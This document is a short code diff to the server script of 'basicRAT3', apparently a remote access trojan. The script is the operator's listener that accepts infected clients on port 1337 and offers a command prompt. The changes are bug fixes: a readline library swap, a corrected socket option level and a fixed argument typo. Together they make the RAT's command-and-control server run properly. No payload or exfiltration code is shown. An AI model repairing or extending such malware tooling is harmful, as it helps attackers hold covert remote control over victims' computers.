@@ -6,7 +6,7 @@
 #
 
 import argparse
-import readline
+import gnureadline
 import socket
 import sys
 import threading
@@ -57,7 +57,7 @@ class Server(threading.Thread):
     def __init__(self, port):
         super(Server, self).__init__()
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.s.setsockopt(socket.AF_INET, socket.SO_REUSEADDR, 1)
+        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('0.0.0.0', port))
         self.s.listen(5)
         
@@ -142,7 +142,7 @@ class ClientConnection():
         self.uid   = uid
 
 def get_parser():
-    parser = argparse.ArgumentParser(descripttion='basicRAT3 Server')
+    parser = argparse.ArgumentParser(description='basicRAT3 Server')
     parser.add_argument('-p', '--port', help='Port to Listen on.', default=1337, type=int)
     return parser
     
@@ -177,8 +177,8 @@ def main():
         return options[state]+' ' if state<len(options) else None  ### DEBUG
 
     # Turn Tab Completion On
-    readline.parse_and_bind('tab: complete')
-    readline.set_completer(completer)
+    gnureadline.parse_and_bind('tab: complete')
+    gnureadline.set_completer(completer)
 
     while True:
         ccid = server.current_client.uid if server.current_client else '?'
